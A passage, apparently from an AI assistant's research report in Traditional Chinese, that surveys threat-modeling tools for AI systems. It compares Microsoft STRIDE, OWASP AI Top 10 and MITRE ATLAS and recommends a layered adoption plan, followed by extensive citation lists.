- [14] [[Galileo] 技術部落格 - 偵測與防範多 Agent 系統中的協同惡意攻擊](https://galileo.ai/blog/coordinated-attacks-multi-agent-ai-systems)
- [15] [[Augment Code] 企業指南 - 多 Agent AI 之企業運作風險、合規與安全防禦](https://www.augmentcode.com/guides/multi-agent-ai-security-risks-compliance-fixes)
- [16] [[Galileo] 技術部落格 - 偵測與防範多 Agent 系統中的協同惡意攻擊](https://galileo.ai/blog/coordinated-attacks-multi-agent-ai-systems)
- [17] [[Infosys] 企業方案 - 多 Agent AI 系統的分層防護安全策略](https://www.infosys.com/iki/perspectives/secure-multiagent-ai.html)
- [18] [[Galileo] 技術部落格 - 偵測與防範多 Agent 系統中的協同惡意攻擊](https://galileo.ai/blog/coordinated-attacks-multi-agent-ai-systems)
- [19] [[Atlan] 技術分析 - 2026 多 Agent AI 的五大結構性安全風險與修復](https://atlan.com/know/ai-agent/ai-agent-governance/how-to-secure-multi-agent-systems-enterprise/)
- [20] [[Cloud Security Alliance] 技術報告 - 自主 AI Agent 的混淆代理人攻擊機制與防禦](https://labs.cloudsecurityalliance.org/research/csa-research-note-ai-agent-confused-deputy-prompt-injection/)
- [21] [[Cloud Security Alliance] 技術報告 - 自主 AI Agent 的混淆代理人攻擊機制與防禦](https://labs.cloudsecurityalliance.org/research/csa-research-note-ai-agent-confused-deputy-prompt-injection/)
- [22] [[Galileo] 技術部落格 - 偵測與防範多 Agent 系統中的協同惡意攻擊](https://galileo.ai/blog/coordinated-attacks-multi-agent-ai-systems)
- [23] [[Galileo] 技術部落格 - 偵測與防範多 Agent 系統中的協同惡意攻擊](https://galileo.ai/blog/coordinated-attacks-multi-agent-ai-systems)
- [24] [[Auth0] 技術部落格 - 從 OWASP Top 10 探討 Agent 應用程式之安全設計](https://auth0.com/blog/owasp-top-10-agentic-applications-lessons/)
- [25] [[Galileo] 技術部落格 - 偵測與防範多 Agent 系統中的協同惡意攻擊](https://galileo.ai/blog/coordinated-attacks-multi-agent-ai-systems)
- [26] [[Snyk Labs] 技術部落格 - MAESTRO：專為 Agent AI 生態系設計的分層威脅建模](https://labs.snyk.io/resources/maestro-threat-modeling/)
- [27] [[Atlan] 技術分析 - 2026 多 Agent AI 的五大結構性安全風險與修復](https://atlan.com/know/ai-agent/ai-agent-governance/how-to-secure-multi-agent-systems-enterprise/)
- [28] [[Cooperative AI] 案例研究 - 近期多 Agent 安全事件教訓與改善建議](https://www.cooperativeai.com/post/lessons-from-multi-agent-safety-incidents)
- [29] [[Cooperative AI] 案例研究 - 近期多 Agent 安全事件教訓與改善建議](https://www.cooperativeai.com/post/lessons-from-multi-agent-safety-incidents)
- [30] [[Atlan] 技術分析 - 2026 多 Agent AI 的五大結構性安全風險與修復](https://atlan.com/know/ai-agent/ai-agent-governance/how-to-secure-multi-agent-systems-enterprise/)
- [31] [[Galileo] 技術部落格 - 偵測與防範多 Agent 系統中的協同惡意攻擊](https://galileo.ai/blog/coordinated-attacks-multi-agent-ai-systems)
- [32] [[Infosys] 企業方案 - 多 Agent AI 系統的分層防護安全策略](https://www.infosys.com/iki/perspectives/secure-multiagent-ai.html)
- [33] [[Snyk Labs] 技術部落格 - MAESTRO：專為 Agent AI 生態系設計的分層威脅建模](https://labs.snyk.io/resources/maestro-threat-modeling/)
- [34] [[Atlan] 技術分析 - 2026 多 Agent AI 的五大結構性安全風險與修復](https://atlan.com/know/ai-agent/ai-agent-governance/how-to-secure-multi-agent-systems-enterprise/)
- [35] [[Augment Code] 企業指南 - 多 Agent AI 之企業運作風險、合規與安全防禦](https://www.augmentcode.com/guides/multi-agent-ai-security-risks-compliance-fixes)
- [36] [[Augment Code] 企業指南 - 多 Agent AI 之企業運作風險、合規與安全防禦](https://www.augmentcode.com/guides/multi-agent-ai-security-risks-compliance-fixes)
- [37] [[Cloud Security Alliance] 技術報告 - 自主 AI Agent 的混淆代理人攻擊機制與防禦](https://labs.cloudsecurityalliance.org/research/csa-research-note-ai-agent-confused-deputy-prompt-injection/)
- [38] [[Cloud Security Alliance] 技術報告 - 自主 AI Agent 的混淆代理人攻擊機制與防禦](https://labs.cloudsecurityalliance.org/research/csa-research-note-ai-agent-confused-deputy-prompt-injection/)
- [39] [Multi-Agent Systems Execute Arbitrary Malicious Code - arXiv](https://arxiv.org/html/2503.12188v1)
- [40] [[Augment Code] 企業指南 - 多 Agent AI 之企業運作風險、合規與安全防禦](https://www.augmentcode.com/guides/multi-agent-ai-security-risks-compliance-fixes)
- [41] [[Augment Code] 企業指南 - 多 Agent AI 之企業運作風險、合規與安全防禦](https://www.augmentcode.com/guides/multi-agent-ai-security-risks-compliance-fixes)
- [42] [[Augment Code] 企業指南 - 多 Agent AI 之企業運作風險、合規與安全防禦](https://www.augmentcode.com/guides/multi-agent-ai-security-risks-compliance-fixes)
- [43] [[Atlan] 技術分析 - 2026 多 Agent AI 的五大結構性安全風險與修復](https://atlan.com/know/ai-agent/ai-agent-governance/how-to-secure-multi-agent-systems-enterprise/)
- [44] [[arXiv] 學術論文 - 多 Agent 機器人系統面臨的 Prompt 注入安全挑戰](https://arxiv.org/html/2608.00747v2?spm=a2ty_o01.29997173.0.0.4ac755fbRoKlfA&file=2608.00747v2)
- [45] [[arXiv] 學術論文 - 多 Agent 機器人系統面臨的 Prompt 注入安全挑戰](https://arxiv.org/html/2608.00747v2?spm=a2ty_o01.29997173.0.0.4ac755fbRoKlfA&file=2608.00747v2)
- [46] [[arXiv] 學術論文 - 多 Agent 機器人系統面臨的 Prompt 注入安全挑戰](https://arxiv.org/html/2608.00747v2?spm=a2ty_o01.29997173.0.0.4ac755fbRoKlfA&file=2608.00747v2)
- [47] [[arXiv] 學術論文 - 多 Agent 機器人系統面臨的 Prompt 注入安全挑戰](https://arxiv.org/html/2608.00747v2?spm=a2ty_o01.29997173.0.0.4ac755fbRoKlfA&file=2608.00747v2)
- [48] [[arXiv] 學術論文 - 多 Agent 機器人系統面臨的 Prompt 注入安全挑戰](https://arxiv.org/html/2608.00747v2?spm=a2ty_o01.29997173.0.0.4ac755fbRoKlfA&file=2608.00747v2)
- [49] [[arXiv] 學術論文 - 多 Agent 機器人系統面臨的 Prompt 注入安全挑戰](https://arxiv.org/html/2608.00747v2?spm=a2ty_o01.29997173.0.0.4ac755fbRoKlfA&file=2608.00747v2)
- [50] [[arXiv] 學術論文 - 多 Agent 機器人系統面臨的 Prompt 注入安全挑戰](https://arxiv.org/html/2608.00747v2?spm=a2ty_o01.29997173.0.0.4ac755fbRoKlfA&file=2608.00747v2)
- [51] [[arXiv] 學術論文 - 多 Agent 機器人系統面臨的 Prompt 注入安全挑戰](https://arxiv.org/html/2608.00747v2?spm=a2ty_o01.29997173.0.0.4ac755fbRoKlfA&file=2608.00747v2)

### 4. 有哪些威脅建模工具可以應用在 AI 系統？Microsoft Threat Modeling Tool、OWASP AI Security、MITRE ATLAS 的比較？

針對 AI 系統的威脅建模，安全社群與學術界已發展出多款**專屬工具、自動化掃描軟體與評估框架**。以下為您整理可用於 AI 系統的威脅建模工具，並針對您提及的 **Microsoft Threat Modeling Tool (代表傳統 STRIDE 建模)**、**OWASP AI Security**、與 **MITRE ATLAS** 進行深度對比與落地建議。

---

### 一、 適用於 AI 系統的威脅建模工具與框架一覽

除了傳統手動繪製資料流圖（DFD）外，目前社群與企業主要使用以下工具來自動化或系統化進行 AI 威脅建模：

1. **STRIDE-AI 網頁評估工具 (aisecurityframework.netlify.app)**：
   這是學術界為配合 **STRIDE-AI 評估框架**所開發的 React.js 單頁應用程式 [1, 2]。它在客戶端運作以確保數據主權 [1]，引導稽核人員走過「Scope 定義 ➔ 資產發現 ➔ STRIDE-AI 威脅建模 ➔ 漏洞評估 ➔ 滲透測試 ➔ 報告生成」等六個完整階段 [1, 2]。
2. **stride-gpt (STRIDE GPT 開源工具)**：
   由社群維護的開源 AI 威脅建模工具，支援 CLI、互動式 REPL 與 Streamlit 網頁介面 [3-5]。它不僅能自動分析程式碼，還內建 draw.io 架構圖 XML 解析功能 [4, 6]，並將生成的威脅自動對照到 **OWASP LLM Top 10**、**OWASP Agentic Applications (ASI)** 與 **MITRE ATLAS** [4, 7]。
3. **MAESTRO Threat Analyzer**：
   雲端安全聯盟（CSA）官方推出的開源工具 [8]。它使用 Genkit 整合 Google Gemini 或 OpenAI 等大語言模型 [8]，專門針對**多 Agent 系統（MAS）**的七層參考架構進行分層威脅識別，並針對傳統威脅與 AI 專屬威脅給出緩解建議 [8-10]。
4. **TITO (Threat In and Threat Out)**：
   一款開源的程式庫靜態掃描器（CLI 工具），能自動識別程式碼庫中的 Agent 運作模式，將資產與數據流映射至 **MAESTRO 架構**與 **MITRE ATT&CK/ATLAS**，並在 CI/CD 流程中自動產出威脅分析報告與阻斷高危合併 [11-15]。
5. **ThreatCanvas (SecureFlag 平台)**：
   現代化威脅建模平台，提供專屬的 STRIDE 風險範本，支援直接從代碼或 textual descriptions 自動生成 DFD 模型，並支援 OWASP、LINDDUN 等多個框架 [16-18]。
6. **Threagile / pytm**：
   傳統的「威脅建模即代碼（Threat Modeling as Code）」工具，也被安全團隊延伸用於定義和持續評估 AI 系統的架構變更 [19]。

---

### 二、 三大框架與工具深度對比：STRIDE、OWASP、MITRE ATLAS

這三個框架在安全生命週期中扮演完全不同的角色：**STRIDE 負責確保周邊系統架構健全，OWASP 提供開發防禦檢核，而 MITRE ATLAS 則提供對手的攻擊戰術情資。** [20, 21]

| 比較維度 | Microsoft Threat Modeling Tool / 傳統 STRIDE [16, 22] | OWASP AI Security 系列 (LLM / Agentic / MCP / Skills) [23, 24] | MITRE ATLAS (Adversarial AI Matrix) [25, 26] |
| :--- | :--- | :--- | :--- |
| **核心定位** | **架構分類與檢核清單** [22]<br>關注確定性系統組件與信任邊界。 | **技術漏洞分類法** [27, 28]<br>針對特定技術層面的具體安全缺陷。 | **攻防技術與戰術矩陣** [25, 26]<br>記錄對手真實攻擊手法的情資庫。 |
| **主導機構** | Microsoft [22] | OWASP 基金會 [29] | MITRE 公司 [26, 30] |
| **分析層級與維度** | **資料流圖 (DFD) 組件**：<br>走訪 Processes、Data Stores、Data Flows 與 Trust Boundaries，評估 Spoofing 到 Elevation of Privilege 六大威脅 [22, 31, 32]。 | **AI 系統技術分層**：<br>- **LLM Top 10**：應用層 [23]<br>- **Agentic Top 10**：代理層 [23]<br>- **MCP Top 10**：協定與工具層 [23]<br>- **Skills Top 10**：組件/插件層 [24] | **攻擊生命週期 (Tactics)**：<br>包含 16 個戰術（如 Model Access、Attack Staging、Evasion、Exfiltration）及 84 個技術與真實案例研究 [33, 34]。 |
| **AI 專屬威脅能力** | **極弱**。無法自然對應機率性系統的失效模式、資料投毒、提示詞注入或目標劫持 [35-37]。 | **極強**。深入分析如目標劫持 (ASI01)、工具濫用 (ASI02)、記憶污染 (ASI06) 與惡意技能 (AST01) [38, 39]。 | **極強**。羅列對手如何進行模型規避 (Evasion)、模型逆向 (Inversion)、RAG 憑證收割等技術 [40, 41]。 |
| **主要優勢** | 1. 結構清晰，開發者不需深厚的安全背景也能快速上手 [42]。<br>2. **極佳的周邊架構防護**（防護 API、認證、資料庫與傳統 IT 邊界） [20, 43]。 | 1. 提供極為具體、工程師友好的技術防禦與程式碼控制建議 [27, 44]。<br>2. 緊跟當前最前沿的 AI 漏洞現狀 [23, 45]。 | 1. 基於真實野外攻擊事件（如 EchoLeak、Bing 注入事件）與研究 [26, 40]。<br>2. 藍隊編寫 SIEM 偵測規則與紅隊設計演練的最佳指引 [46]。 |
| **局限性** | 僅關注 deterministic 系統缺陷，用於 AI 時會產生大量的安全盲區 [36, 47]。 | 僅為指引，**不提供系統化的企業治理流程**，亦缺乏在法規合規上的外部稽核證明力 [44, 48, 49]。 | 是對手的「攻擊劇本」，**不提供防禦架構設計**。不指導如何設計身分認證、權限控制或日誌審計 [25, 50]。 |

---

### 三、 企業落地實踐建議：如何組合疊加使用？

在實務上，沒有任何單一框架能完全解決 AI 系統的安全問題 [45, 51]。最成熟的 AI 安全防護應採取**分層疊加（Layered Stacking）**的方式將它們組合使用 [49, 52, 53]：

```
      ┌─────────────────────────────────────────────────────────┐
 1    │              NIST AI RMF (組織治理與合規流程)           │  ➔ 決定組織如何治理、量測與管理風險
      └────────────────────────────┬────────────────────────────┘
                                   ▼
      ┌─────────────────────────────────────────────────────────┐
 2    │          Microsoft 傳統 STRIDE 建模 (周邊架構)          │  ➔ 守護 Web API, DB, 認證與傳統 IT 基礎設施
      └────────────────────────────┬────────────────────────────┘
                                   ▼
      ┌─────────────────────────────────────────────────────────┐
 3    │         OWASP AI Top 10 系列 (開發期防禦與代碼)         │  ➔ 開發時遵循 XML 隔離、參數 Schema 校驗與 Least Agency
      └────────────────────────────┬────────────────────────────┘
                                   ▼
      ┌─────────────────────────────────────────────────────────┐
 4    │          MITRE ATLAS 矩陣 (運行期偵測與紅隊測試)        │  ➔ 紅隊模擬 Jailbreak, 藍隊設定 SIEM 偵測模型異常
      └─────────────────────────────────────────────────────────┘
```

1. **第一步：使用 NIST AI RMF 進行宏觀風險對照**
   利用其 Core Functions（Govern, Map, Measure, Manage）釐清企業內部的 AI 系統清單、定義風險容忍度，並明確界定合規邊界（例如應對 EU AI Act 的稽核準備） [54-56]。
2. **第二步：使用傳統 STRIDE / Microsoft Tool 鎖定基礎設施與周邊防範**
   確保 AI 系統周邊的傳統架構安全 [57]。例如：限制管理員接口的存取權限（Elevation of Privilege）、對日誌與對話歷史進行完整紀錄（Repudiation）、以及防止 API 被流量洪泛攻擊（Denial of Service） [58]。
3. **第三步：引入 OWASP Top 10 轉化為安全開發標準**
   在開發團隊編寫模型介面或 Agent 工具時，將其要求直接寫入開發規範中 [49, 59]。例如在串接外部資料時實施 **StruQ 指令與數據通道語義隔離** [60]、在調用高危工具時設定強制的**人工確認節點（HITL）** [61]。
4. **第四步：對照 MITRE ATLAS 進行紅隊演練與安全觀測**
   當系統進入測試或部署階段，利用 ATLAS 中的技術矩陣進行攻擊路徑模擬（例如測試 RAG 管道的中毒容忍度），並根據 ATLAS techniques 提供的特徵，在企業觀測系統（Observability Layer）中布建相對應的異常偵測告警 [46, 49, 62]。

🧩 **接下來，您是否希望我協助您針對上述其中一項特定框架的自動化實作（例如：如何使用 stride-gpt CLI 自動掃描您的程式碼庫以生成 SARIF 威脅報告，或是如何將 MAESTRO 威脅分類內建到 GitHub Actions CI/CD Pipeline 中）給予您具體的設定指南與實作步驟？**

**引用來源：**
- [1] [STRIDE-AI: A Threat Modeling Framework for Generative AI Security Assessment - arXiv](https://arxiv.org/html/2605.17163v1)
- [2] [STRIDE-AI: A Threat Modeling Framework for Generative AI Security Assessment - arXiv](https://arxiv.org/html/2605.17163v1)
- [3] [[mrwadams] GitHub 專案 - stride-gpt 基於 GPT 之 STRIDE 自動化威脅建模工具](https://github.com/mrwadams/stride-gpt)
- [4] [[mrwadams] GitHub 專案 - stride-gpt 基於 GPT 之 STRIDE 自動化威脅建模工具](https://github.com/mrwadams/stride-gpt)
- [5] [[mrwadams] GitHub 專案 - stride-gpt 基於 GPT 之 STRIDE 自動化威脅建模工具](https://github.com/mrwadams/stride-gpt)
- [6] [[mrwadams] GitHub 專案 - stride-gpt 基於 GPT 之 STRIDE 自動化威脅建模工具](https://github.com/mrwadams/stride-gpt)
- [7] [[mrwadams] GitHub 專案 - stride-gpt 基於 GPT 之 STRIDE 自動化威脅建模工具](https://github.com/mrwadams/stride-gpt)
- [8] [[Cloud Security Alliance] GitHub 專案 - MAESTRO 威脅建模工具與開源代碼](https://github.com/CloudSecurityAlliance/MAESTRO)
- [9] [[Cloud Security Alliance] GitHub 專案 - MAESTRO 威脅建模工具與開源代碼](https://github.com/CloudSecurityAlliance/MAESTRO)
- [10] [[Snyk Labs] 技術部落格 - MAESTRO：專為 Agent AI 生態系設計的分層威脅建模](https://labs.snyk.io/resources/maestro-threat-modeling/)
- [11] [[Cloud Security Alliance] 應用指南 - 將 MAESTRO 框架部署至 CI/CD Pipeline 實務](https://cloudsecurityalliance.org/blog/2026/02/11/applying-maestro-to-real-world-agentic-ai-threat-models-from-framework-to-ci-cd-pipeline)
- [12] [[Cloud Security Alliance] 應用指南 - 將 MAESTRO 框架部署至 CI/CD Pipeline 實務](https://cloudsecurityalliance.org/blog/2026/02/11/applying-maestro-to-real-world-agentic-ai-threat-models-from-framework-to-ci-cd-pipeline)
- [13] [[Cloud Security Alliance] 應用指南 - 將 MAESTRO 框架部署至 CI/CD Pipeline 實務](https://cloudsecurityalliance.org/blog/2026/02/11/applying-maestro-to-real-world-agentic-ai-threat-models-from-framework-to-ci-cd-pipeline)
- [14] [[Cloud Security Alliance] 應用指南 - 將 MAESTRO 框架部署至 CI/CD Pipeline 實務](https://cloudsecurityalliance.org/blog/2026/02/11/applying-maestro-to-real-world-agentic-ai-threat-models-from-framework-to-ci-cd-pipeline)
- [15] [[Cloud Security Alliance] 應用指南 - 將 MAESTRO 框架部署至 CI/CD Pipeline 實務](https://cloudsecurityalliance.org/blog/2026/02/11/applying-maestro-to-real-world-agentic-ai-threat-models-from-framework-to-ci-cd-pipeline)
- [16] [[SecureFlag] 技術指南 - STRIDE 威脅建模模型介紹](https://blog.secureflag.com/2026/06/05/guide-to-stride-threat-model/)
- [17] [[SecureFlag] 技術指南 - STRIDE 威脅建模模型介紹](https://blog.secureflag.com/2026/06/05/guide-to-stride-threat-model/)
- [18] [[SecureFlag] 技術指南 - STRIDE 威脅建模模型介紹](https://blog.secureflag.com/2026/06/05/guide-to-stride-threat-model/)
- [19] [[Augment Code] 技術部落格 - AI Agent 系統之威脅建模與安全維護](https://www.augmentcode.com/guides/ai-agentic-threat-modeling)
- [20] [[InfosecTrain] 比較分析 - MITRE ATLAS 與傳統 STRIDE 對於 AI 威脅建模之對比](https://www.infosectrain.com/blog/mitre-atlas-vs-stride-for-ai-threat-modeling)
- [21] [[NHI Management Group] 比較分析 - MITRE ATLAS 與 NIST AI RMF、OWASP 架構之區別與關聯](https://nhimg.org/faq/what-is-the-difference-between-mitre-atlas-and-control-frameworks-like-nist-ai-r/)
- [22] [[Practical DevSecOps] 部落格文章 - 十大威脅建模方法論比較](https://www.practical-devsecops.com/types-of-threat-modeling-methodology/)
- [23] [[Speakeasy] 比較分析 - NIST AI RMF、MITRE ATLAS 與 OWASP 框架對比](https://www.speakeasy.com/resources/ai-security-frameworks/)
- [24] [[OWASP] 官方標準 - Agentic Skills 十大安全風險指引](https://owasp.org/www-project-agentic-skills-top-10/)
- [25] [[Creative Bits AI] 部落格文章 - 企業如何評估與選擇合適的 AI 安全標準](https://creativebitsai.com/ai-security-framework-comparison/)
- [26] [[Speakeasy] 比較分析 - NIST AI RMF、MITRE ATLAS 與 OWASP 框架對比](https://www.speakeasy.com/resources/ai-security-frameworks/)
- [27] [[Creative Bits AI] 部落格文章 - 企業如何評估與選擇合適的 AI 安全標準](https://creativebitsai.com/ai-security-framework-comparison/)
- [28] [[Speakeasy] 比較分析 - NIST AI RMF、MITRE ATLAS 與 OWASP 框架對比](https://www.speakeasy.com/resources/ai-security-frameworks/)
- [29] [[Microsoft 官方] 技術文件 - 透過 Copilot Studio 因應 OWASP Agentic AI 十大風險](https://www.microsoft.com/en-us/security/blog/2026/03/30/addressing-the-owasp-top-10-risks-in-agentic-ai-with-microsoft-copilot-studio/)
- [30] [[技術部落格] 比較分析 - NIST AI RMF 與 MITRE ATLAS 框架定位與功能差異](https://aisecurityandsafety.org/en/compare/nist-ai-rmf-vs-mitre-atlas/)
- [31] [[SecureFlag] 技術指南 - STRIDE 威脅建模模型介紹](https://blog.secureflag.com/2026/06/05/guide-to-stride-threat-model/)
- [32] [[SecureFlag] 技術指南 - STRIDE 威脅建模模型介紹](https://blog.secureflag.com/2026/06/05/guide-to-stride-threat-model/)
- [33] [[Speakeasy] 比較分析 - NIST AI RMF、MITRE ATLAS 與 OWASP 框架對比](https://www.speakeasy.com/resources/ai-security-frameworks/)
- [34] [[Speakeasy] 比較分析 - NIST AI RMF、MITRE ATLAS 與 OWASP 框架對比](https://www.speakeasy.com/resources/ai-security-frameworks/)
- [35] [[Augment Code] 技術部落格 - AI Agent 系統之威脅建模與安全維護](https://www.augmentcode.com/guides/ai-agentic-threat-modeling)
- [36] [[Cloud Security Alliance] 官方架構 - MAESTRO Agentic AI 威脅建模框架](https://cloudsecurityalliance.org/blog/2025/02/06/agentic-ai-threat-modeling-framework-maestro)
- [37] [STRIDE-AI: A Threat Modeling Framework for Generative AI Security Assessment - arXiv](https://arxiv.org/html/2605.17163v1)
- [38] [[Auth0] 技術部落格 - 從 OWASP Top 10 探討 Agent 應用程式之安全設計](https://auth0.com/blog/owasp-top-10-agentic-applications-lessons/)
- [39] [[OWASP] 官方標準 - Agentic Skills 十大安全風險指引](https://owasp.org/www-project-agentic-skills-top-10/)
- [40] [[Truefoundry] 企業指南 - 2026 年 AI 安全框架與標準](https://www.truefoundry.com/blog/ai-security-frameworks)
- [41] [[Augment Code] 技術部落格 - AI Agent 系統之威脅建模與安全維護](https://www.augmentcode.com/guides/ai-agentic-threat-modeling)
- [42] [[SecureFlag] 技術指南 - STRIDE 威脅建模模型介紹](https://blog.secureflag.com/2026/06/05/guide-to-stride-threat-model/)
- [43] [[InfosecTrain] 比較分析 - MITRE ATLAS 與傳統 STRIDE 對於 AI 威脅建模之對比](https://www.infosectrain.com/blog/mitre-atlas-vs-stride-for-ai-threat-modeling)
- [44] [[Truefoundry] 企業指南 - 2026 年 AI 安全框架與標準](https://www.truefoundry.com/blog/ai-security-frameworks)
- [45] [[Speakeasy] 比較分析 - NIST AI RMF、MITRE ATLAS 與 OWASP 框架對比](https://www.speakeasy.com/resources/ai-security-frameworks/)
- [46] [[Truefoundry] 企業指南 - 2026 年 AI 安全框架與標準](https://www.truefoundry.com/blog/ai-security-frameworks)
- [47] [STRIDE-AI: A Threat Modeling Framework for Generative AI Security Assessment - arXiv](https://arxiv.org/html/2605.17163v1)
- [48] [[Speakeasy] 比較分析 - NIST AI RMF、MITRE ATLAS 與 OWASP 框架對比](https://www.speakeasy.com/resources/ai-security-frameworks/)
- [49] [[Speakeasy] 比較分析 - NIST AI RMF、MITRE ATLAS 與 OWASP 框架對比](https://www.speakeasy.com/resources/ai-security-frameworks/)
- [50] [[Speakeasy] 比較分析 - NIST AI RMF、MITRE ATLAS 與 OWASP 框架對比](https://www.speakeasy.com/resources/ai-security-frameworks/)
- [51] [[Speakeasy] 比較分析 - NIST AI RMF、MITRE ATLAS 與 OWASP 框架對比](https://www.speakeasy.com/resources/ai-security-frameworks/)
- [52] [[Truefoundry] 企業指南 - 2026 年 AI 安全框架與標準](https://www.truefoundry.com/blog/ai-security-frameworks)
- [53] [[Truefoundry] 企業指南 - 2026 年 AI 安全框架與標準](https://www.truefoundry.com/blog/ai-security-frameworks)
- [54] [[Truefoundry] 企業指南 - 2026 年 AI 安全框架與標準](https://www.truefoundry.com/blog/ai-security-frameworks)
- [55] [[ioSENTRIX] 技術指南 - 機器學習管線風險對照與威脅建模](https://iosentrix.com/blog/ai-system-threat-modeling)
- [56] [[Speakeasy] 比較分析 - NIST AI RMF、MITRE ATLAS 與 OWASP 框架對比](https://www.speakeasy.com/resources/ai-security-frameworks/)
- [57] [[InfosecTrain] 比較分析 - MITRE ATLAS 與傳統 STRIDE 對於 AI 威脅建模之對比](https://www.infosectrain.com/blog/mitre-atlas-vs-stride-for-ai-threat-modeling)
- [58] [[InfosecTrain] 比較分析 - MITRE ATLAS 與傳統 STRIDE 對於 AI 威脅建模之對比](https://www.infosectrain.com/blog/mitre-atlas-vs-stride-for-ai-threat-modeling)
- [59] [[NHI Management Group] 比較分析 - MITRE ATLAS 與 NIST AI RMF、OWASP 架構之區別與關聯](https://nhimg.org/faq/what-is-the-difference-between-mitre-atlas-and-control-frameworks-like-nist-ai-r/)
- [60] [[Augment Code] 企業指南 - 多 Agent AI 之企業運作風險、合規與安全防禦](https://www.augmentcode.com/guides/multi-agent-ai-security-risks-compliance-fixes)
- [61] [[Cycode] 解讀分析 - 2026 年 OWASP Agentic 應用安全十大風險詳細解析](https://cycode.com/blog/owasp-top-10-agentic-applications/)
- [62] [[ioSENTRIX] 技術指南 - 機器學習管線風險對照與威脅建模](https://iosentrix.com/blog/ai-system-threat-modeling)

## 已移除的來源（品質過濾）

- Prompt injection attacks on tool-calling agents: A verification approach : r/aiagents - Reddit — 該來源為 Reddit 社群討論貼文，屬於簡短且無具體結論的社群問答，缺乏有深度技術細節或具體論據支撐的實質內容。

## 參考來源清單

- [Multi-Agent Systems Execute Arbitrary Malicious Code - arXiv](https://arxiv.org/html/2503.12188v1)
- [STRIDE-AI: A Threat Modeling Framework for Generative AI Security Assessment - arXiv](https://arxiv.org/pdf/2605.17163)
- [STRIDE-AI: A Threat Modeling Framework for Generative AI Security Assessment - arXiv](https://arxiv.org/html/2605.17163v1)
- [[Airia] 技術部落格 - 企業級 AI 與其尚未受到重視的 Prompt 注入攻擊面](https://airia.com/blog/prompt-injection-and-enterprise-ai-the-attack-surface-most-security-teams-arent-monitoring/)
- [[Atlan] 技術分析 - 2026 多 Agent AI 的五大結構性安全風險與修復](https://atlan.com/know/ai-agent/ai-agent-governance/how-to-secure-multi-agent-systems-enterprise/)
- [[Atlan] 技術文章 - 2026 年 Prompt 注入攻擊如何侵入與劫持 AI Agent](https://atlan.com/know/prompt-injection-attacks-ai-agents/)
- [[Augment Code] 企業指南 - 多 Agent AI 之企業運作風險、合規與安全防禦](https://www.augmentcode.com/guides/multi-agent-ai-security-risks-compliance-fixes)
- [[Augment Code] 技術部落格 - AI Agent 系統之威脅建模與安全維護](https://www.augmentcode.com/guides/ai-agentic-threat-modeling)
- [[Auth0] 技術部落格 - 從 OWASP Top 10 探討 Agent 應用程式之安全設計](https://auth0.com/blog/owasp-top-10-agentic-applications-lessons/)
- [[Cloud Security Alliance] GitHub 專案 - MAESTRO 威脅建模工具與開源代碼](https://github.com/CloudSecurityAlliance/MAESTRO)
- [[Cloud Security Alliance] 官方架構 - MAESTRO Agentic AI 威脅建模框架](https://cloudsecurityalliance.org/blog/2025/02/06/agentic-ai-threat-modeling-framework-maestro)
- [[Cloud Security Alliance] 應用指南 - 將 MAESTRO 框架部署至 CI/CD Pipeline 實務](https://cloudsecurityalliance.org/blog/2026/02/11/applying-maestro-to-real-world-agentic-ai-threat-models-from-framework-to-ci-cd-pipeline)
- [[Cloud Security Alliance] 技術報告 - 自主 AI Agent 的混淆代理人攻擊機制與防禦](https://labs.cloudsecurityalliance.org/research/csa-research-note-ai-agent-confused-deputy-prompt-injection/)
- [[Cooperative AI] 案例研究 - 近期多 Agent 安全事件教訓與改善建議](https://www.cooperativeai.com/post/lessons-from-multi-agent-safety-incidents)
- [[Creative Bits AI] 部落格文章 - 企業如何評估與選擇合適的 AI 安全標準](https://creativebitsai.com/ai-security-framework-comparison/)
- [[Cycode] 解讀分析 - 2026 年 OWASP Agentic 應用安全十大風險詳細解析](https://cycode.com/blog/owasp-top-10-agentic-applications/)
- [[Frontier Model Forum] 技術報告 - 針對 AI Agent 的前沿新興安全實踐](https://www.frontiermodelforum.org/issue-briefs/emerging-security-practices-for-ai-agents/)
- [[Galileo] 技術部落格 - 偵測與防範多 Agent 系統中的協同惡意攻擊](https://galileo.ai/blog/coordinated-attacks-multi-agent-ai-systems)
- [[HUMAN Security] 解讀分析 - 解密 OWASP Agentic AI 的十項關鍵安全威脅](https://www.humansecurity.com/learn/blog/owasp-top-10-agentic-applications/)
- [[InfosecTrain] 比較分析 - MITRE ATLAS 與傳統 STRIDE 對於 AI 威脅建模之對比](https://www.infosectrain.com/blog/mitre-atlas-vs-stride-for-ai-threat-modeling)
- [[Infosys] 企業方案 - 多 Agent AI 系統的分層防護安全策略](https://www.infosys.com/iki/perspectives/secure-multiagent-ai.html)
- [[Lakera] 技術文章 - 間接 Prompt 注入對現代 AI 系統的破壞性安全漏洞](https://www.lakera.ai/blog/indirect-prompt-injection)
- [[Microsoft 官方] 技術文件 - 透過 Copilot Studio 因應 OWASP Agentic AI 十大風險](https://www.microsoft.com/en-us/security/blog/2026/03/30/addressing-the-owasp-top-10-risks-in-agentic-ai-with-microsoft-copilot-studio/)
- [[NHI Management Group] 比較分析 - MITRE ATLAS 與 NIST AI RMF、OWASP 架構之區別與關聯](https://nhimg.org/faq/what-is-the-difference-between-mitre-atlas-and-control-frameworks-like-nist-ai-r/)
- [[OWASP] 官方標準 - Agentic Skills 十大安全風險指引](https://owasp.org/www-project-agentic-skills-top-10/)
- [[PMC] 學術論文 - 使用傳統 STRIDE 對 AI-ML 系統進行威脅建模實踐](https://pmc.ncbi.nlm.nih.gov/articles/PMC9459912/)
- [[Practical DevSecOps] 部落格文章 - 十大威脅建模方法論比較](https://www.practical-devsecops.com/types-of-threat-modeling-methodology/)
- [[Promptfoo] 安全資料庫 - Agent 系統編排劫持攻擊與防護](https://www.promptfoo.dev/lm-security-db/vuln/agent-system-orchestration-hijack-11cbc618/)
- [[SecureFlag] 技術指南 - STRIDE 威脅建模模型介紹](https://blog.secureflag.com/2026/06/05/guide-to-stride-threat-model/)
- [[Snyk Labs] 技術部落格 - MAESTRO：專為 Agent AI 生態系設計的分層威脅建模](https://labs.snyk.io/resources/maestro-threat-modeling/)
- [[Speakeasy] 比較分析 - NIST AI RMF、MITRE ATLAS 與 OWASP 框架對比](https://www.speakeasy.com/resources/ai-security-frameworks/)
- [[Truefoundry] 企業指南 - 2026 年 AI 安全框架與標準](https://www.truefoundry.com/blog/ai-security-frameworks)
- [[arXiv] 學術論文 - LLM 多 Agent 協作之錯誤級聯效應建模與緩解方案](https://arxiv.org/html/2603.04474v1)
